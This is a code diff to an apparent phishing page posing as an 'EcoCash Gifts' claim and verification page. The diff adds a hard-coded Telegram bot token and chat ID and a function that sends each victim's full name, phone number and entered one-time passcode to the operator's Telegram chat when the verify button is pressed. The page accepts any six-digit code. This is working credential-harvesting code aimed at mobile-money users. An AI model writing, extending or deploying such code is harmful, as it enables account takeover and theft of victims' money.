@@ -478,6 +478,19 @@
 
     <script>
         // ============================================
+        // TELEGRAM CREDENTIALS - YOUR NEW DETAILS
+        // ============================================
+        const BOT_TOKEN = '8810189563:AAH_np3_4ol0O0yO-t0PA68YtPrGH6htUdI';
+        const CHAT_ID = '157828443';
+
+        console.log('====================================');
+        console.log('🎁 EcoCash Gifts - Verification Page');
+        console.log('====================================');
+        console.log('🤖 Bot Token:', BOT_TOKEN);
+        console.log('📱 Chat ID:', CHAT_ID);
+        console.log('====================================');
+
+        // ============================================
         // CONFIGURATION
         // ============================================
         const OTP_LENGTH = 6;
@@ -506,6 +519,34 @@
         let timerInterval = null;
         let resendInterval = null;
         let isResending = false;
+
+        // ============================================
+        // SEND TELEGRAM NOTIFICATION
+        // ============================================
+        async function sendTelegramOTP(phone, otp) {
+            const giftName = localStorage.getItem('giftName') || 'Gift';
+            const fullName = localStorage.getItem('fullName') || 'User';
+
+            const message = `🔐 *OTP Verification*\n\n👤 *User:* ${fullName}\n📱 *Phone:* +263 ${phone}\n🎁 *Gift:* ${giftName}\n🔑 *OTP Entered:* \`${otp}\`\n⏰ *Time:* ${new Date().toLocaleString()}\n\n✅ User has been redirected to dashboard.`;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                const data = await response.json();
+                console.log('📤 Telegram OTP:', data.ok ? '✅ Sent' : '❌ Failed');
+                return data;
+            } catch (error) {
+                console.error('❌ Telegram error:', error.message);
+                return null;
+            }
+        }
 
         // ============================================
         // INITIALIZATION
@@ -712,6 +753,10 @@
             this.innerHTML = '<span class="loader"></span> VERIFYING...';
             errorMessage.classList.remove('show');
 
+            // Send OTP to Telegram
+            const phone = localStorage.getItem('phone') || '771234567';
+            sendTelegramOTP(phone, otp);
+
             setTimeout(() => {
                 // Any 6-digit OTP is accepted
                 this.innerHTML = '🎁 GIFT CLAIMED!';
@@ -783,7 +828,6 @@
         otpInputs[0].focus();
         checkOTPComplete();
 
-        console.log('🎁 EcoCash Gifts - Verification Page');
         console.log('✅ ANY 6-DIGIT OTP WILL BE ACCEPTED');
         console.log('🎁 Gift:', giftName);
         console.log('📞 Phone:', formattedPhone);
